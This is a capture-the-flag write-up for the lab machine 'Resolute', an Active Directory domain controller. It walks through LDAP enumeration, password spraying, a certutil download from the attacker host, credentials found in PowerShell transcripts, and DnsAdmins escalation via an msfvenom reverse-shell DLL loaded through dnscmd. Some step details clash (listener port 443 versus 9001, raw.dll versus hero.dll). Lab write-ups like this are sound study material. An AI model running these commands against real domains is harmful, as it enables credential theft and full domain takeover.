
## CTF Writeup: Resolute

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.96.155
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 13:11 -0500
Nmap scan report for 10.129.96.155
Host is up (0.022s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-08-10 18:19:39Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49705/tcp open  msrpc        Microsoft Windows RPC
49737/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2026-08-10T11:20:35-07:00
| smb2-time: 
|   date: 2026-08-10T18:20:34
|_  start_date: 2026-08-10T18:17:20
|_clock-skew: mean: 2h27m01s, deviation: 4h02m31s, median: 7m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.41 seconds
```

The target seems to be an Domain Controller. The TCP provides us with information about the Hostname "Resolution", the Domain "megabank.local" & the FQDN "resolute.megabank.local". Let's map them all to the target ip address in our local dns file.

```
echo "10.129.96.155 resolute.megabank.local megabank.local resolute" | tee -a /etc/hosts
```

Enumerated LDAP Server Information as anonymous user.

```
ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" > ldapsearch.txt
```

Grep'd description information and retrieved an interesting password.

```
cat ldapsearch.txt| grep description
Welcome123!
```

Created an users wordlist out of the ldap output.

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower($1)}' | sort -u > users.txt
```

Sprayed credentials and got an valid user hit for user "melanie".

```
nxc smb megabank.local -u ../creds/users3.txt -p Welcome123! --shares
```

Also enumerated SMB shares, but there wasn't any non-default SMB Shares available. 

Created an wordlist and stored the output in an newusers.txt file on my local machine.

```
nxc smb megabank.local -u melanie -p Welcome123! --rid-brute > newusers.txt
```

Formatted the output accordingly for future bruteforcing.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

```
nxc smb megabank.local -u melanie -p Welcome123! --users > users2.txt
```

Format Wordlist

```
awk '{
  if (NF >= 5) {
    # 情况1：用户名直接出现在第5个字段（如 Administrator, Guest, marko 等）
    if ($5 !~ /^[\[\-]/ && $5 !~ /^[0-9]/ && $5 != "-Username-") {
      print $5
    }
    # 情况2：用户名嵌在类似 "megabank.local\melanie:Welcome123!" 的字段中
    else if ($6 ~ /\\/) {
      split($6, a, "\\")
      split(a[2], b, ":")
      print b[1]
    }
  }
}' users2.txt | sort -u > users4.txt
```

Connected to the Domain Controller & retrieved 

```
nxc winrm megabank.local -u melanie -p Welcome123!             
WINRM       10.129.96.155   5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local) 
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

Retrieved user.txt in C:\Users\melanie\Desktop.

```
8aaaaf8daafe4be205c2a662b57c14d4
```
## Privilege Escalation

I tried to enumerate anything valuable, but couldn't find anything interesting.

```
whoami /all
```

Decided to transfer winPEAS onto the target server.

```
certutil -urlcache -split -f http://10.10.14.57/winPEASx64.exe winPEAS.exe
```

After enumeration I was able to identify an "PSTranscript" Directory in the Root in which an .txt file is stored which revealed credentials for user "ryan".

```
ryan:Serv3r4Admin4cc123!
```

Connected to the Domain Controller as user "ryan".

```
evil-winrm -i megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
```

Enumerated that there is an note.txt file in ryan's Desktop.

```
C:\Users>tree . /f
```

```
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

Enumerated Groups & Permissions of user "ryan" & identified that he seems to be part of "DnsAdmins" & "Contractors" Group.

```
whoami /all
```

Ran winPEAS & while it ran I downloaded domain information using bloodhound-python.

```
bloodhound-python -u ryan -p 'Serv3r4Admin4cc123!' -ns 10.129.96.155 -d megabank.local -c all
```

Uploaded domain information onto bloodhound & inspected the ACL's of user "ryan". He is part of DnsAdmins Group which has WriteOwner & WriteDacl on MicrosoftDNS Container. But this seems to not be the way to privesc. I had to research.

As member of the DnsAdmin Group, we can execute dnscmd.exe command with external DLL plugin file via ryan account for Priv Esc.

1. Now we need to prepare a DLL that will be supplied as the serverlevelplugindll. We can use msfvenom for this.

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.57 LPORT=9001 -f dll > raw.dll
```

2. Transfer the .dll file onto the target server.

WARNING: Has to be impacket-smbclient transfer.
```
impacket-smbserver share $(pwd)
```

3. Configure DNS Service to use the plugin.dll as the serverlevelplugin.dll

```
cmd /c dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.57\share\hero.dll
```

4. Started up netcat listener on local machine.

```
rlwrap nc -lvnp 443
```

5. Restart DNS Service.

```
sc.exe stop dns
sc.exe start dns
```

Gained RCE as Administrator.

```
rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.54.249] 49906
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
328e6ae9f9f9d1d2b204c9292ee34d7a
```